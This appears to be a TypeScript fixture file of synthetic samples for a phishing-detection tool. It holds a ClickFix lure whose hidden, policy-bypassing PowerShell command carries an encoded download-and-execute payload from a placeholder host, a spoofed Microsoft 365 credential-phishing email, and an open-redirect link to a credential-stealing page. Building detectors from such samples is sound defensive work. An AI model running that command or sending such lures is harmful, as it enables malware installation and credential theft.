import type { SampleArtifact } from '../types/phishlens';

export const SYNTHETIC_SAMPLES: SampleArtifact[] = [
  {
    id: 'clickfix-verify',
    label: 'ClickFix "Verify You Are Human" (Base64 PowerShell)',
    category: 'ClickFix Lure',
    content: `[SYNTHETIC CLICKFIX LURE CLIPBOARD PAYLOAD]
Prompt shown on fake Cloudflare / reCAPTCHA modal:
"Verify you are human by completing the security check:
1. Press Windows Key + R
2. Press Ctrl + V
3. Press Enter"

Clipboard payload captured prior to execution:
powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0ATgBvAFAAIAAtAFcAIABIAGkAZABkAGUAbgAgAC0AYwAgACIAaQByAG0AIABoAHQAdABwAHMAOgAvAC8AYwBkAG4ALQB2AGUAcgBpAGYAeQAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACAAfAAgAGkAZQB4ACIA # Verify Human ID: 88412-CF`,
  },
  {
    id: 'm365-phish',
    label: 'Spoofed Microsoft 365 Password Expiry (SPF/DMARC Fail)',
    category: 'Credential Phishing',
    content: `From: "Microsoft 365 IT Helpdesk" <security-alerts@m365-support-portal.example.invalid>
Reply-To: helpdesk-ticket@fastmail-relay.example.invalid
To: employee@corp-target.example.com
Subject: [ACTION REQUIRED] Your Microsoft 365 password expires in 2 hours
Date: Thu, 14 Nov 2026 09:14:22 +0000
Authentication-Results: mx.corp-target.example.com;
  spf=fail (sender IP 198.51.100.44 not permitted) smtp.mailfrom=m365-support-portal.example.invalid;
  dkim=none;
  dmarc=fail (p=REJECT header.from=microsoft.com)
Received: from mail-relay-09.example.invalid (198.51.100.44) by mx.corp-target.example.com

Dear User,

Your corporate Microsoft 365 password is scheduled to expire today at 12:00 UTC. Failure to revalidate your session will lock access to Outlook, Teams, and SharePoint.

Keep your current password by confirming your credentials immediately:
hxxps://login-microsoftonline-auth.example.invalid/oauth2/v2.0/password-reset?tenant=corp-target&session=9481a

IT Security Operations
Microsoft 365 Identity Team`,
  },
  {
    id: 'oauth-open-redirect',
    label: 'OAuth Open-Redirect Chain (accounts.example.com)',
    category: 'Open Redirect',
    content: `Suspected link extracted from Slack DM ("Review Q4 bonus spreadsheet"):
https://accounts.example.com/auth/redirect?client_id=sso-portal&response_type=code&next=hxxp://evil-login.example.invalid/steal?ref=corp_sso`,
  },
];
